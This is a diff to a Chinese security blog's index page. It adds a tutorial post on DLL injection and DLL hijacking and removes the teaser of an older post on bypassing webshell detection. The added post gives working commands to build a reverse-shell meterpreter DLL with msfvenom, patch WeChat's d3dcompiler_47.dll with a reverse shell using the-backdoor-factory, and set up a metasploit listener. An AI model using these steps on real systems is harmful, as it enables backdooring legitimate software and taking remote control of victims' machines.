@@ -259,6 +259,206 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Guko">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guko's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/" itemprop="url">DLL注入&DLL劫持DLL&the-backdoor-factory</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T10:12:18+08:00">
+                2020-01-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  790 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h4><p>DDLL注入是一种允许攻击者在另一个进程的地址空间的上下文中运行任意代码的技术。攻击者使用DLL注入的过程中如果被赋予过多的运行特权，</p>
+<p>那么攻击者就很有可能会在DLL文件中嵌入自己的恶意攻击代码以获取更高的执行权限。下图是OpenSecurityResearch博客文章中对此过程进行简化的可视化视图：</p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/1.jpg" alt="1"></p>
+<p>通常需要以下几个步骤:</p>
+<p>附加到目标/远程进程</p>
+<p>在目标/远程进程内分配内存</p>
+<p>将DLL文件路径，或者DLL文件，复制到目标/远程进程的内存空间</p>
+<p>控制进程运行DLL文件</p>
+<h4 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h4><p>手动注入，可以从头开始创建DLL,也可以通过metasploitmsfvenom创建DLL，该文件可以生成特定有效内容的DLL文件<br>，注意如果DLL被注入进程是64位，那么应该使用64位有效负责<br>生成DLL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.197.188 LPORT=5555 -f dll &gt; tmp.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/2.png" alt="2"></p>
+<p>下一步设置监听器，方便恶意DLL注入进程后接收连接</p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/3.png" alt="3"></p>
+<p>这里说以下关于DLL注入的工具Remote DLL Injector,这个工具使用的是CreateRemoteThread技术,它可以将DLL<br>注入到启用了ASLR的进程中，工具的使用只需要提供进程ID和DLL路径两个参数</p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/4.png" alt="4"></p>
+<p>RemoteDLLInjector在初始运行的时候会展示位了完成DLL注入所涉及到的所有步骤，如下图</p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/5.png" alt="5"></p>
+<p>如果DLL被成功注入,那么就会返回一个meterpreter会话，所以具有搞权限的进程可能会事攻击者首选要注入的进程以执行提权操作</p>
+<p>此外还有PowerSploit的Invoke-DLLInjection模块</p>
+<h4 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h4><p>DLL劫持，主要是劫持经常运行的DLL，这样程序一运行，就会加载我们的恶意DLL，实现控制</p>
+<p>应用程序寻找DLL的过程</p>
+<p>程序所在目录</p>
+<p>系统目录既SYSYTEM目录</p>
+<p>16位系统目录既SYSYTEM目录</p>
+<p>Windows目录</p>
+<p>加载DLL时所在的当前目录</p>
+<p>PATH环境变量中列出的目录</p>
+<h4 id="the-backdoor-factory"><a href="#the-backdoor-factory" class="headerlink" title="the-backdoor-factory"></a>the-backdoor-factory</h4><p>使用Process Explorer进程管理器,找到微信进程，查看微信运行所需要的dll文件，本次此时我们使用d3dcompiler_47.dll</p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/6.png" alt="6"></p>
+<p>将d3dcompiler_47.dll文件复制到kali的the-backdoor-factory下方便使用</p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/7.png" alt="7"></p>
+<p>运行the-backdoor-factory,使用如下命令，来查找可以利用的payload，可以看到有不少可以植入的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py -f d3dcompiler_47.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/8.png" alt="8"></p>
+<p>直接获取shell,选择reverse_shell_tcp_lnline这个pyload,输入如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py -f d3dcompiler_47.dll -s reverse_shell_tcp_inline -P 7777 -H 192.168.197.193</span><br></pre></td></tr></table></figure>
+
+<p>-P，指定端口<br>-H，指定反弹shell的攻击机IP地址</p>
+<p>命令执行成功后，会列出可以执行后门的位置，选择2,植入完成后会存在工具子弟啊的backdoored目录下,生成一个同名的dll文件</p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/9.png" alt="9"></p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/10.png" alt="10"></p>
+<p>把这个生成的dll文件跟之前的dll文件做一个替换</p>
+<p>接下来在mmsfconsole中开启监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/shell_reverse_tcp</span><br><span class="line">set lhost 192.168.199.193</span><br><span class="line">set lport 7777</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/11.png" alt="11"><br><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/12.png" alt="12"></p>
+<p>然后运行微信,既可收到meterpreter会话</p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/13.png" alt="13"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/31/Apache之Solr-Velocity模板远程代码执行/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1793,183 +1993,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/27/利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Guko">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Guko's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/27/利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历/" itemprop="url">利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-27T14:21:54+08:00">
-                2019-08-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1.1k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  4 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00:前言"></a>0x00:前言</h4><p>主站搞不下来，只能看看子域名有没有什么收获，发现任意文件上传，但是有防护软件对上传文件的后缀跟内容作了检测，不能是jsp后缀，常规的jsp后门都会被杀，且只要检测到是jsp后缀跟恶意内容ip就会被防护软件拉黑，导致访问不了网站。</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/08/27/利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2020,7 +2043,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2097,7 +2120,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -2111,7 +2134,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">184.7k</span>
+    <span title="Site words total count">185.5k</span>
   
 </div>
 
